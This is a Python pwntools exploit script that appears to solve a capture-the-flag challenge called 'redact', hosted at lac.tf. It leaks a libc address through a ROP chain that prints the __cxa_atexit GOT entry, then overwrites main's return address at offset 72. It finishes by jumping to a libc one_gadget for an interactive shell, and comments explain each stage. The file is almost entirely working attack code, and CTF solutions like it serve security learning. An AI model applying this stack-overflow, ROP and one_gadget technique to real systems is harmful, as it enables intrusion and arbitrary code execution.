from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', action='store_true')
    args = parser.parse_args()

    context.terminal = ['tmux', 'splitw', '-h']
    elf = context.binary = ELF('./redact')
    rop = ROP([elf])

    if args.remote:
        io = remote('lac.tf', 31281)
    elif args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()

    print(io.recvuntil(b'Enter some text: '))
    io.sendline(b'')

    print(io.recvuntil(b'Enter a placeholder: '))
    cout = elf.sym['_ZSt4cout']  # std::cout
    # std::operator<< (std::ostream&, char const*)
    ios_op = elf.plt['_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc']
    # Create payload to print got entry of the libc function __cxa_atexit
    # This allows us to leak the libc base
    # Later we use that to jump to a one_gadget in libc
    # We also jump back to main at the end so we can do another ROP chain
    payload = (p64(rop.rsi.address) + p64(elf.got['__cxa_atexit']) + p64(0) +
               p64(rop.rdi.address) + p64(cout) +
               p64(ios_op) +
               p64(elf.sym['main']))
    assert (b'\n' not in payload)
    io.sendline(payload)

    print(io.recvuntil(b'Enter the index of the stuff to redact: '))
    # Offset was found via cyclic(1000) and then examining the stack when the ret instruction was executed
    # The std::copy works because our text std::string is small buffer optimized
    # This means that the string is stored on the stack and not in the heap
    # We can use that to overwrite the return address of main
    io.sendline(b'72')

    io.recvn(1)
    cxa_atexit_leak = io.recvn(6) + b'\x00\x00'
    cxa_atexit_leak = unpack(cxa_atexit_leak)
    libc_base = cxa_atexit_leak - elf.libc.sym['__cxa_atexit']
    print('libc base', hex(libc_base))

    # Phase 2

    libc = elf.libc
    libc.address = libc_base
    rop = ROP([elf, libc])

    print(io.recvuntil(b'Enter a placeholder: '))
    one_gadget = 0xc9620
    payload = (p64(rop.rsi.address) + p64(0) +
               p64(rop.rdx.address) + p64(0) + p64(libc_base + one_gadget))
    assert (b'\n' not in payload)
    io.sendline(payload)

    io.recvuntil(b'Enter the index of the stuff to redact: ')
    io.sendline(b'72')

    io.interactive()
